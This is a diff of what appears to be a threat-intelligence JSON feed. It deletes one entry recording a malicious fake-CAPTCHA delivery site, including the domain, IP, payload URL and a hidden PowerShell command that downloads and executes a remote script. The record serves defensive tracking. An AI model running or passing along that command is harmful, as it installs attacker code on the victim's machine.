@@ -6921,24 +6921,5 @@
     ],
     "ReportId": "cmwohx2dv1zej0oml7l27yiez",
     "ScannedAt": "2026-11-20T04:45:29.109000+00:00"
-  },
-  {
-    "UrlDomain": "danieltschumi.com",
-    "DeliveryUrl": [
-      "simpludelicios.md"
-    ],
-    "PayloadUrl": [
-      "https://simpludelicios.md/vcapcha.ps1"
-    ],
-    "IP": [
-      "149.126.4.94"
-    ],
-    "Related": [],
-    "Payload": "powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('https://simpludelicios[.]md/vcapcha.ps1'))\"",
-    "ResolvedDownloadUrl": [
-      "https://simpludelicios.md/vcapcha.ps1"
-    ],
-    "ReportId": "cmwoed01h1z340oml4kvksqv8",
-    "ScannedAt": "2026-11-20T03:05:54.133000+00:00"
   }
 ]
